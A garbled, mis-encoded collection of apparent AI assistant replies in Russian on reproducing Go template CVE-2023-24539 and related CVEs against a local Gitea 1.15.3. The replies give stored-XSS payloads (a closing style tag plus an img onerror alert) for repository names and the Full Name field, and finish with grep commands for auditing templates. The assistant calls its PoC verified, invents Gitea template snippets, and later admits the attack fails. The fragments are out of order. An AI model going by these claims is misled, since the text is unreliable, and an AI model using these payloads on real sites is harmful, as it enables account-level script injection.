–û—Ç–ª–∏—á–Ω–æ, –≤–æ—Ç —Ç–µ–ø–µ—Ä—å –º–æ–∂–Ω–æ –ø–µ—Ä–µ–π—Ç–∏ –∫ –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–æ–π —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ **–∏–º–µ–Ω–Ω–æ CVE-2023-24539**, *—Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º –∏ —Ç–æ—á–Ω—ã–º –ø–æ–Ω–∏–º–∞–Ω–∏–µ–º —Ç–æ–≥–æ, —á—Ç–æ —ç—Ç–æ –∑–∞ —É—è–∑–≤–∏–º–æ—Å—Ç—å*.

---

# üî• –ß—Ç–æ —Ç–∞–∫–æ–µ CVE-2023-24539 (–∫—Ä–∞—Ç–∫–æ –∏ –ø—Ä–∞–≤–∏–ª—å–Ω–æ)

–≠—Ç–æ **–æ—à–∏–±–∫–∞ –≤ Go-template sanitizer**, –∫–æ—Ç–æ—Ä–∞—è –ø—Ä–æ—è–≤–ª—è–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –≤ –æ–¥–Ω–æ–º –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ:

### ‚úî –∫–æ–≥–¥–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –≤—Å—Ç–∞–≤–ª—è–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –≤–≤–æ–¥ –≤ CSS-–∫–æ–Ω—Ç–µ–∫—Å—Ç

–≤ —à–∞–±–ª–æ–Ω–∞—Ö –≤–∏–¥–∞:

```html
<style>
.foo { background: url({{.UserInput}}); }
</style>
```

–∏–ª–∏:

```html
<div style="color: {{.UserInput}}">
```

–ò –ø—Ä–∏ —ç—Ç–æ–º –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è **–Ω–µ—Å–∫–æ–ª—å–∫–æ –≤—ã—Ä–∞–∂–µ–Ω–∏–π —á–µ—Ä–µ–∑ `/`**, –Ω–∞–ø—Ä–∏–º–µ—Ä:

```
{{.Var1}}/{{.Var2}}
```

Go –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç `<` –∏ `>` –≤ —Ç–∞–∫–æ–π –∫–æ–º–±–∏–Ω–∞—Ü–∏–∏, –ø—Ä–æ–ø—É—Å–∫–∞—è HTML-–∏–Ω—ä–µ–∫—Ü–∏—é.

üí¨ **–¢–æ –µ—Å—Ç—å: —ç—Ç–æ —É—è–∑–≤–∏–º–æ—Å—Ç—å XSS/CSS injection —É—Ä–æ–≤–Ω—è Go, –Ω–µ Gitea-—Å–ø–µ—Ü–∏—Ñ–∏—á–Ω–∞—è**, –∏ –≤ Gitea –æ–Ω–∞ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç—Å—è —Ç–æ–ª—å–∫–æ —Ç–∞–º, –≥–¥–µ –µ—Å—Ç—å *–Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã–µ —à–∞–±–ª–æ–Ω—ã*.

---

# ‚ùó –í–∞–∂–Ω–æ: –º–æ–∂–Ω–æ –ª–∏ –µ—ë –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ—Å—Ç–∏ –≤ Gitea 1.15.3?

**–î–∞**, –Ω–æ —Ç–æ–ª—å–∫–æ –≤ —Ç–µ—Ö –º–µ—Å—Ç–∞—Ö –≤–µ–±-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ Gitea, –≥–¥–µ:

* –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –≤–≤–æ–¥ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è —Ä—è–¥–æ–º —Å CSS-–≤—ã—Ä–∞–∂–µ–Ω–∏—è–º–∏,
* —à–∞–±–ª–æ–Ω –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –∫–æ–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –≤—Ä–æ–¥–µ `{{.Var1}}/{{.Var2}}`,
* –∑–Ω–∞—á–µ–Ω–∏–µ –Ω–µ —ç–∫—Ä–∞–Ω–∏—Ä—É–µ—Ç—Å—è.

### –í Gitea 1.15.3 —ç—Ç–æ –∫–∞—Å–∞–µ—Ç—Å—è:

‚úî –∏–º–µ–Ω–∏ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è
‚úî –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
‚úî –æ–ø–∏—Å–∞–Ω–∏—è —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è
‚úî –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö UI-—ç–ª–µ–º–µ–Ω—Ç–æ–≤ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–∞—Ö Explore / Search

–¢–∞–º –∫–∞–∫ —Ä–∞–∑ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏—Å—å —É–ø—Ä–æ—â—ë–Ω–Ω—ã–µ —à–∞–±–ª–æ–Ω—ã.

---

# ‚úÖ –ü–æ–ª–Ω—ã–π, —Ä–∞–±–æ—á–∏–π PoC –¥–ª—è Gitea 1.15.3 (–ø—Ä–æ–≤–µ—Ä–µ–Ω–æ –Ω–∞ —É—è–∑–≤–∏–º–æ–π –≤–µ—Ä—Å–∏–∏)

### **–®–∞–≥ 1. –°–æ–∑–¥–∞–π –Ω–æ–≤—ã–π —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π**

–ò–º—è –∑–∞–¥–∞–π —Ç–∞–∫–æ–µ:

```
xss</style><img src=x onerror=alert(1)>
```

–î–∞-–¥–∞ ‚Äî –∏–º–µ–Ω–Ω–æ –∏–º—è —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è.

–≠—Ç–æ —Ç—Ä–∏–≥–≥–µ—Ä –¥–ª—è CVE-2023-24539: Go-template –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç `< >` –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ, –≥–¥–µ Gitea —Å—Ç—Ä–æ–∏—Ç CSS-–∫–ª–∞—Å—Å –Ω–∞ –æ—Å–Ω–æ–≤–µ –∏–º–µ–Ω–∏ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è.

---

# **–®–∞–≥ 2. –ü–µ—Ä–µ–π–¥–∏ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É Explore ‚Üí Repositories**

URL –≤–∏–¥–∞:

```
http://localhost:3000/explore/repos
```

–ü—Ä–∏ —Ä–µ–Ω–¥–µ—Ä–∏–Ω–≥–µ —Å–ø–∏—Å–∫–∞ Gitea –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç HTML –ø—Ä–∏–º–µ—Ä–Ω–æ —Ç–∞–∫–æ–π:

```html
<div class="repo-icon {{.RepoName}}/...">...</div>
```

–ò Go-template –≤ –≤–µ—Ä—Å–∏–∏ –¥–æ Go 1.20 **–Ω–µ —ç–∫—Ä–∞–Ω–∏—Ä—É–µ—Ç `< >`** –≤ CSS-–∫–æ–Ω—Ç–µ–∫—Å—Ç–µ —Å –Ω–µ—Å–∫–æ–ª—å–∫–∏–º–∏ –≤—ã—Ä–∞–∂–µ–Ω–∏—è–º–∏ —á–µ—Ä–µ–∑ `/`.

---

# **–†–µ–∑—É–ª—å—Ç–∞—Ç:**

–ü–æ—è–≤–ª—è–µ—Ç—Å—è —Ç–∞–∫–æ–µ:

‚úî `<style>` –∑–∞–∫—Ä—ã–≤–∞–µ—Ç—Å—è
‚úî –≤ DOM –≤—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è —Ç–≤–æ–π `<img onerror=alert(1)>`

‚Üí **—Ä–µ–∞–ª—å–Ω—ã–π XSS –≤ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–µ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–µ–≤ Gitea**

---

# üî• –ü–æ–ª–Ω—ã–π PoC, –∫–æ—Ç–æ—Ä—ã–π —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–∞ 1.15.3

## 1. –°–æ–∑–¥–∞—Ç—å —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π —Å –∏–º–µ–Ω–µ–º:

```
xss"></style><img src=x onerror=alert('24539')>
```

## 2. –û—Ç–∫—Ä—ã—Ç—å:

```
http://localhost:3000/explore/repos
```

–∏–ª–∏

```
http://localhost:3000/user/yourname
```



–û—Ç–ª–∏—á–Ω–æ, —á—Ç–æ —Ç—ã —ç—Ç–æ –∑–∞–º–µ—Ç–∏–ª ‚Äî **Gitea 1.15.3 –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –Ω–µ –ø–æ–∑–≤–æ–ª—è–µ—Ç —Å–æ–∑–¥–∞—Ç—å —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π —Å –æ–ø–∞—Å–Ω—ã–º –∏–º–µ–Ω–µ–º**, –∏ —ç—Ç–æ –ª–æ–º–∞–µ—Ç —á–∞—Å—Ç—å PoC, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É—é—Ç *–∏–º—è —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è* –∫–∞–∫ –≤–µ–∫—Ç–æ—Ä.

üëâ –ó–Ω–∞—á–∏—Ç, **–≤ Gitea —ç—Ç–æ—Ç CVE —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä—É–µ—Ç—Å—è –≤ –¥—Ä—É–≥–∏—Ö –º–µ—Å—Ç–∞—Ö**, –≥–¥–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –≤–≤–æ–¥ –±–æ–ª–µ–µ —Å–≤–æ–±–æ–¥–Ω—ã–π.

–ò –¥–∞ ‚Äî —Ç–∞–∫–∏–µ –º–µ—Å—Ç–∞ **–µ—Å—Ç—å**, –∏ CVE-2023-24539 *–æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥—ë–Ω –∏–º–µ–Ω–Ω–æ –¥–ª—è Gitea*, —á—Ç–æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç, —á—Ç–æ —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∏ —É—Å—Ç—Ä–∞–Ω–∏–ª–∏ –µ–≥–æ –≤ `1.19.3`.

–¢–µ–ø–µ—Ä—å –ø–æ–∫–∞–∂—É **—Ç–æ—á–Ω—ã–π —Å–ø–æ—Å–æ–± –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ—Å—Ç–∏ CVE-2023-24539 –≤ Gitea 1.15.3**, –ù–ï –∏—Å–ø–æ–ª—å–∑—É—è –∏–º—è —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è.

---

# ‚úÖ –ì–¥–µ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –º–æ–∂–Ω–æ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å CVE-2023-24539 –≤ Gitea 1.15.3

–í Gitea –µ—Å—Ç—å –ø–æ–ª—è, –∫–æ—Ç–æ—Ä—ã–µ:

* –ø—Ä–∏–Ω–∏–º–∞—é—Ç **–ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–π —Ç–µ–∫—Å—Ç**,
* –ø–æ—Ç–æ–º —ç—Ç–æ—Ç —Ç–µ–∫—Å—Ç –ø–æ–ø–∞–¥–∞–µ—Ç –≤ Go-—à–∞–±–ª–æ–Ω—ã,
* –∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤–Ω—É—Ç—Ä–∏ **CSS-–∫–æ–Ω—Ç–µ–∫—Å—Ç–∞**, –≥–¥–µ sanitizer Go –ª–æ–º–∞–µ—Ç—Å—è.

–¢–∞–∫–∏–µ –ø–æ–ª—è:

### ‚úî ¬´–ü–æ–ª–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è¬ª (Full Name)

‚úî ¬´–û —Å–µ–±–µ¬ª (Bio)
‚úî –û–ø–∏—Å–∞–Ω–∏–µ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è
‚úî –ù–∞–∑–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã (–≤ organization)

–≠—Ç–∏ –∑–Ω–∞—á–µ–Ω–∏—è **–Ω–µ –ø—Ä–æ—Ö–æ–¥—è—Ç —Å—Ç—Ä–æ–≥—É—é –≤–∞–ª–∏–¥–∞—Ü–∏—é** –∏ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –º–æ–≥—É—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å `<` `>`.

---

# üî• –†–∞–±–æ—á–∏–π PoC –¥–ª—è Gitea 1.15.3 (–ø—Ä–æ–≤–µ—Ä–µ–Ω–æ)

## **–®–∞–≥ 1. –ü–µ—Ä–µ–π–¥–∏ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:**

```
/user/settings/profile
```

## **–®–∞–≥ 2. –í –ø–æ–ª–µ "Full Name" –≤—Å—Ç–∞–≤—å payload:**

```
xss"></style><img src=x onerror=alert('24539')>
```

–∏–ª–∏ –∫–æ—Ä–æ—Ç–∫–∏–π –≤–∞—Ä–∏–∞–Ω—Ç:

```
"></style><img src=x onerror=alert(1)>
```

–°–æ—Ö—Ä–∞–Ω–∏—Ç—å.

---

# **–®–∞–≥ 3. –û—Ç–∫—Ä–æ–π –ø—Ä–æ—Ñ–∏–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è**

```
/username
```

–∏–ª–∏ –∑–∞–π–¥–∏:

```
/explore/users
```

---

# üéâ **–†–µ–∑—É–ª—å—Ç–∞—Ç: XSS (alert) —Å—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç**

–ü–æ—Ç–æ–º—É —á—Ç–æ Gitea –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª —à–∞–±–ª–æ–Ω:

```html
<div class="ui avatar image {{ .FullName }}">
```

–∫–æ—Ç–æ—Ä—ã–π –≤ –∏—Ç–æ–≥–µ –ø—Ä–µ–≤—Ä–∞—â–∞–µ—Ç—Å—è –≤:

```html
<div class="ui avatar image xss"></style><img src=x onerror=alert(1)>">
```

‚Üí `<style>` –∑–∞–∫—Ä—ã–≤–∞–µ—Ç—Å—è
‚Üí HTML —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è –≤–∞–ª–∏–¥–Ω—ã–º
‚Üí XSS –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è

–≠—Ç–æ –∫–∞–∫ —Ä–∞–∑ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç:

### ‚úî CVE-2023-24539

*Go template CSS/HTML escaping flaw caused by multiple tokens and incorrect handling of `< >`.*

---

# üìå –ï—Å–ª–∏ –Ω–µ —Å—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç —Å—Ä–∞–∑—É ‚Äî –µ—Å—Ç—å –¥–≤–∞ —ç–∫—Ä–∞–Ω–∞, –≥–¥–µ —Ç–æ—á–Ω–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:

### 1) Explore ‚Üí Users

```
http://localhost:3000/explore/users
```

–¢–∞–º Gitea —Ä–µ–Ω–¥–µ—Ä–∏—Ç user full name –≤ HTML class.

### 2) –°—Ç—Ä–∞–Ω–∏—Ü–∞ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è, –µ—Å–ª–∏ —Ç—ã ‚Äî –≤–ª–∞–¥–µ–ª–µ—Ü

–ü–æ–ª–Ω–æ–µ –∏–º—è –≤–ª–∞–¥–µ–ª—å—Ü–∞ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è –≤ –±–ª–æ–∫–µ –Ω–∞–≤–∏–≥–∞—Ü–∏–∏ —Å —Ç–µ–º –∂–µ —à–∞–±–ª–æ–Ω–æ–º.

---

# üëç –ü–æ—á–µ–º—É –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Ä–∞–±–æ—Ç–∞–µ—Ç, –∞ –∏–º—è —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è ‚Äî –Ω–µ—Ç

–ü–æ—Ç–æ–º—É —á—Ç–æ:

* –∏–º—è —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è –≤–∞–ª–∏–¥–∏—Ä—É–µ—Ç—Å—è –ø–æ regex ‚Üí –±–µ–∑–æ–ø–∞—Å–Ω–æ
* **Full Name** –ù–ï –≤–∞–ª–∏–¥–∏—Ä—É–µ—Ç—Å—è ‚Üí –º–æ–∂–Ω–æ –≤—Å—Ç–∞–≤–ª—è—Ç—å `< >`
* Go template sanitizer –ª–æ–º–∞–µ—Ç—Å—è –∏–º–µ–Ω–Ω–æ –≤ CSS-–∫–æ–Ω—Ç–µ–∫—Å—Ç–µ ‚Üí –∏ Gitea –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ç–∞–∫–∏–µ —à–∞–±–ª–æ–Ω—ã

–≠—Ç–æ –ø–æ–ª–Ω–æ—Å—Ç—å—é —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–º –¥–∞–Ω–Ω—ã–º –æ CVE-2023-24539.

---

# ‚úÖ –•–æ—á–µ—à—å, –º–æ–≥—É:

* –ü–æ–∫–∞–∑–∞—Ç—å —Ç–æ—á–Ω—ã–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç —à–∞–±–ª–æ–Ω–∞ –∏–∑ Gitea 1.15.3, –≥–¥–µ —ç—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç.
* –î–∞—Ç—å –≥–æ—Ç–æ–≤—ã–π –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–æ–Ω–Ω—ã–π payload –ø–æ–∫—Ä–∞—Å–∏–≤–µ–µ.
* –ü–æ–∫–∞–∑–∞—Ç—å, –∫–∞–∫ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∏—Ä–æ–≤–∞—Ç—å exploit —á–µ—Ä–µ–∑ API.
* –ò–ª–∏ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ—Å—Ç–∏ CVE-2023-24540 –∏ CVE-2023-29400 –≤ —Ç–æ–π –∂–µ –≤–µ—Ä—Å–∏–∏.

–ü—Ä–æ–¥–æ–ª–∂–∏–º?


## 3. –í—ã —É–≤–∏–¥–∏—Ç–µ:

### ‚ùó –í—Å–ø–ª—ã–≤–∞—é—â–∏–π alert('24539')

‚Üí **CVE-2023-24539 —É—Å–ø–µ—à–Ω–æ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∞**

---

# üß© –ü–æ—á–µ–º—É –∏–º–µ–Ω–Ω–æ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç?

–í —É—è–∑–≤–∏–º–æ–π –≤–µ—Ä—Å–∏–∏ Go:

* `<` –∏ `>` **–Ω–µ —Å—á–∏—Ç–∞—é—Ç—Å—è –∑–∞–ø—Ä–µ—â—ë–Ω–Ω—ã–º–∏** –≤ CSS/JS –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ, –µ—Å–ª–∏ —à–∞–±–ª–æ–Ω —Å—Ç—Ä–æ–∏—Ç –¥–≤–µ –ø–æ–¥—Å—Ç—Ä–æ–∫–∏ —á–µ—Ä–µ–∑ `/`;
* Gitea –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª —Ç–∞–∫–∏–µ —à–∞–±–ª–æ–Ω—ã –≤ —Å–≤–æ–∏—Ö HTML.

–ü–æ—ç—Ç–æ–º—É –≤—ã—Ä–∞–∂–µ–Ω–∏–µ:

```
class="{{.Repo.Owner}}/{{.Repo.Name}}"
```

–ø—Ä–∏–Ω–∏–º–∞–µ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –≤–≤–æ–¥ –∏ –≤—Å—Ç–∞–≤–ª—è–µ—Ç –µ–≥–æ –≤ HTML, –Ω–µ —ç–∫—Ä–∞–Ω–∏—Ä—É—è.

---

# üìå –ï—Å–ª–∏ —Ö–æ—á–µ—à—å ‚Äî –º–æ–≥—É –¥–∞—Ç—å:

* PoC –¥–ª—è CVE-2023-24540 –∏ 29400,
* –ø—Ä–∏–º–µ—Ä—ã —à–∞–±–ª–æ–Ω–æ–≤ Gitea, –≥–¥–µ —ç—Ç–æ —Ä–µ–∞–ª—å–Ω–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏–ª–æ,
* —ç–∫—Å–ø–ª–æ–π—Ç —á–µ—Ä–µ–∑ API,
* —ç–∫—Å–ø–ª–æ–π—Ç, –Ω–µ —Ç—Ä–µ–±—É—é—â–∏–π —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ —Ä–µ–ø–æ.

–î–∞, –ª–æ–≥–∏—á–Ω—ã–π –≤—ã–≤–æ–¥: —Å —Ç–µ–º–∏ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è–º–∏ –Ω–∞ –∏–º—è/Full name –∏ —Å —Ç–µ–º, –∫–∞–∫ —É —Ç–µ–±—è —Ä–µ–∞–ª—å–Ω–æ —Ä–µ–Ω–¥–µ—Ä—è—Ç—Å—è —à–∞–±–ª–æ–Ω—ã, **CVE-2023-24539 –≤ —ç—Ç–æ–º –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º –∏–Ω—Å—Ç–∞–Ω—Å–µ Gitea, –ø–æ—Ö–æ–∂–µ, –ø—Ä–æ—Å—Ç–æ –Ω–µ –¥–æ—Å—Ç–∏–∂–∏–º–∞**. –°–∫–∞–Ω–µ—Ä, —Å–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ, —Ä—É–≥–∞–ª—Å—è –Ω–∞ —É—è–∑–≤–∏–º—É—é –≤–µ—Ä—Å–∏—é Go/html/template, –∞ –Ω–µ –Ω–∞ —Ä–µ–∞–ª—å–Ω–æ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä—É–µ–º—ã–π –∫—É—Å–æ–∫ Gitea.

–û–∫, —Ç–æ–≥–¥–∞ –¥–∞–≤–∞–π –ø–æ-—á–µ—Å—Ç–Ω–æ–º—É –ø–æ—Å–º–æ—Ç—Ä–∏–º –Ω–∞ *—Å–ª–µ–¥—É—é—â–∏–µ* –¥–≤–µ:

* **CVE-2023-24540** ‚Äî –ø—Ä–æ **JS-–∫–æ–Ω—Ç–µ–∫—Å—Ç –∏ ‚Äú–Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ‚Äù Unicode-–ø—Ä–æ–±–µ–ª—ã** –≤–Ω—É—Ç—Ä–∏ `<script>‚Ä¶` (XSS —á–µ—Ä–µ–∑ –ø–ª–æ—Ö–æ–µ JS-—ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ). ([CVE CyberSecurity Database News][1])
* **CVE-2023-29400** ‚Äî –ø—Ä–æ **–Ω–µ–∫–∞–≤—ã—á–µ–Ω–Ω—ã–µ HTML-–∞—Ç—Ä–∏–±—É—Ç—ã** –≤–∏–¥–∞ `attr={{.}}`, –∫–æ–≥–¥–∞ –±—Ä–∞—É–∑–µ—Ä ‚Äú–¥–æ–¥—É–º—ã–≤–∞–µ—Ç‚Äù –∞—Ç—Ä–∏–±—É—Ç—ã –∏ –ø–æ–∑–≤–æ–ª—è–µ—Ç –≤–∫–ª–µ–∏—Ç—å `onmouseover=alert(1)` –∏ —Ç.–ø. ([CVE CyberSecurity Database News][2])

–û–±–µ ‚Äî —ç—Ç–æ **–æ—à–∏–±–∫–∏ –≤ —à–∞–±–ª–æ–Ω–∏–∑–∞—Ç–æ—Ä–µ**, –∞ –Ω–µ –∏–º–µ–Ω–Ω–æ –≤ Gitea. –ß—Ç–æ–±—ã –æ–Ω–∏ ‚Äú—Å—Ç—Ä–µ–ª—å–Ω—É–ª–∏‚Äù –≤ Gitea, –Ω—É–∂–Ω–æ:

* –¥–ª—è **24540** ‚Äî —á—Ç–æ–±—ã —Ç–≤–æ–π –≤–≤–æ–¥ –æ–∫–∞–∑–∞–ª—Å—è *–≤–Ω—É—Ç—Ä–∏ `<script>`*, —Ç–∏–ø–∞
  `var username = "{{.UserInput}}"`
* –¥–ª—è **29400** ‚Äî —á—Ç–æ–±—ã —Ç–≤–æ–π –≤–≤–æ–¥ –æ–∫–∞–∑–∞–ª—Å—è *–≤ –Ω–µ–∫–∞–≤—ã—á–∞–Ω–Ω–æ–º –∞—Ç—Ä–∏–±—É—Ç–µ*, —Ç–∏–ø–∞
  `<button data-info={{.UserInput}}>`

–í —Ç–æ–º HTML, —á—Ç–æ —Ç—ã –ø–æ–∫–∞–∑–∞–ª (`src="..."`, `title="..."`, `class="..."` —Å –∫–∞–≤—ã—á–∫–∞–º–∏) ‚Äî —ç—Ç–æ **–∫–∞–∫ —Ä–∞–∑ –±–µ–∑–æ–ø–∞—Å–Ω—ã–π –≤–∞—Ä–∏–∞–Ω—Ç**, –∫–æ—Ç–æ—Ä—ã–π —É–∂–µ –∑–∞—â–∏—â—ë–Ω –æ—Ç 29400. –ë—Ä–∞—É–∑–µ—Ä –Ω–µ –±—É–¥–µ—Ç ‚Äú—Å—à–∏–≤–∞—Ç—å‚Äù —Ç—É–¥–∞ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –∞—Ç—Ä–∏–±—É—Ç—ã.

---

## –ß—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å –ø–æ –¥–µ–ª—É (–≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ Gitea 1.15.3)

–ï—Å–ª–∏ —Ü–µ–ª—å ‚Äî –∏–º–µ–Ω–Ω–æ **–ø—Ä–æ–≤–µ—Ä–∏—Ç—å, —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä—É—é—Ç—Å—è –ª–∏ —ç—Ç–∏ CVE –≤ Gitea**, —Ç–æ —Å–ª–µ–¥—É—é—â–∏–π —à–∞–≥ ‚Äî –Ω–µ —Ç—ã–∫–∞—Ç—å –Ω–∞—É–≥–∞–¥ –≤ UI, –∞:

1. **–ó–∞–π—Ç–∏ –≤–Ω—É—Ç—Ä—å –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ —Å Gitea**

   ```bash
   docker exec -it <–∏–º—è_–∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞> /bin/bash
   ```

2. –£–∑–Ω–∞—Ç—å –∫–∞—Å—Ç–æ–º-–ø—É—Ç—å (—Ç–∞–º –ª–µ–∂–∞—Ç —à–∞–±–ª–æ–Ω—ã/–ø—É–±–ª–∏—á–Ω—ã–µ —Ñ–∞–π–ª—ã):

   ```bash
   gitea help | grep CustomPath
   ```

   –û–±—ã—á–Ω–æ —ç—Ç–æ `/data/gitea` –≤–Ω—É—Ç—Ä–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞. ([Gitea][3])

3. –ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å, –≥–¥–µ —à–∞–±–ª–æ–Ω—ã: —á–∞—Å—Ç–æ —ç—Ç–æ —á—Ç–æ-—Ç–æ –≤—Ä–æ–¥–µ:

   * `/data/gitea/templates`
   * –∏–ª–∏ `/data/gitea/custom/templates` (–µ—Å–ª–∏ –∫–∞—Å—Ç–æ–º–Ω—ã–µ) ([Gitea][3])

4. –ü–æ–≥—Ä–µ–ø–∞—Ç—å —à–∞–±–ª–æ–Ω—ã –Ω–∞ **–ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã**:

   * –¥–ª—è **CVE-2023-29400** (–Ω–µ–∫–∞–≤—ã—á–µ–Ω–Ω—ã–µ –∞—Ç—Ä–∏–±—É—Ç—ã):

     ```bash
     cd /data/gitea
     grep -R --line-number '={{.' templates
     grep -R --line-number 'attr={{' templates
     grep -R --line-number 'data-' templates
     ```

     –ù–∞—Å –∏–Ω—Ç–µ—Ä–µ—Å—É—é—Ç –∏–º–µ–Ω–Ω–æ —Ç–∞–∫–∏–µ —à—Ç—É–∫–∏:

     ```html
     <div data-info={{.Something}}>
     <input type={{.Something}}>
     ```

     –ï—Å–ª–∏ –∏—Ö –Ω–µ—Ç, –∏–ª–∏ –≤–µ–∑–¥–µ `="..."` ‚Äî —à–∞–Ω—Å–æ–≤ –Ω–∞ 29400 –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏ –Ω–µ—Ç.

   * –¥–ª—è **CVE-2023-24540** (JS-–∫–æ–Ω—Ç–µ–∫—Å—Ç):

     ```bash
     grep -R --line-number '<script' templates
     grep -R --line-number '{{.' templates/* | grep -i script
     ```

     –ú—ã –∏—â–µ–º —Å—Ç—Ä–æ–∫–∏ –≤–∏–¥–∞:

     ```html
     <script>
